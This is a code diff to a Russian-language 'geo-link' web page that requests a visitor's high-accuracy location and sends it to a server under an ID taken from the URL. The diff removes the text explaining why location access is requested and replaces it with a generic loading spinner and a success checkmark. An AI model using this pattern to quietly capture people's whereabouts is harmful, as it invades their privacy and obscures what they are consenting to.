@@ -7,16 +7,47 @@
   <style>
     body { font-family: sans-serif; text-align: center; margin-top: 50px; }
     #status { margin-top: 20px; }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .checkmark {
+      width: 48px;
+      height: 48px;
+      display: inline-block;
+      border-radius: 50%;
+      background: #4caf50;
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .checkmark:after {
+      content: '';
+      position: absolute;
+      left: 14px;
+      top: 22px;
+      width: 12px;
+      height: 24px;
+      border-right: 4px solid #fff;
+      border-bottom: 4px solid #fff;
+      transform: rotate(45deg);
+    }
   </style>
 </head>
 <body>
   <h1>Гео-ссылка</h1>
-  <p>Для подтверждения местоположения разрешите доступ к геолокации.</p>
-  <div id="status">Ожидание разрешения...</div>
+  <div id="loader" style="margin:40px auto;">
+    <div class="spinner" style="margin:0 auto 20px;width:48px;height:48px;border:6px solid #eee;border-top:6px solid #3498db;border-radius:50%;animation:spin 1s linear infinite;"></div>
+    <div id="status">Загрузка данных...</div>
+  </div>
   <script>
     const pathParts = window.location.pathname.split('/').filter(Boolean);
     const id = pathParts[pathParts.length - 1];
     const status = document.getElementById('status');
+    const loader = document.getElementById('loader');
+
+    function showCheckmark() {
+      loader.innerHTML = '<span class="checkmark"></span><div>Успешно!</div>';
+    }
 
     function sendLocation(lat, lon) {
       fetch(`/api/geo/${id}`, {
@@ -27,13 +58,15 @@
       .then(res => res.json())
       .then(data => {
         if (data.ok) {
-          status.textContent = 'Местоположение успешно отправлено!';
+          showCheckmark();
         } else {
           status.textContent = 'Ошибка: ' + (data.error || 'Неизвестная ошибка');
+          loader.querySelector('.spinner')?.remove();
         }
       })
       .catch(() => {
         status.textContent = 'Ошибка отправки данных на сервер.';
+        loader.querySelector('.spinner')?.remove();
       });
     }
 
@@ -45,10 +78,17 @@
         },
         err => {
           status.textContent = 'Доступ к геолокации не разрешён.';
+          loader.querySelector('.spinner')?.remove();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
         }
       );
     } else {
       status.textContent = 'Геолокация не поддерживается вашим устройством.';
+      loader.querySelector('.spinner')?.remove();
     }
   </script>
 </body>
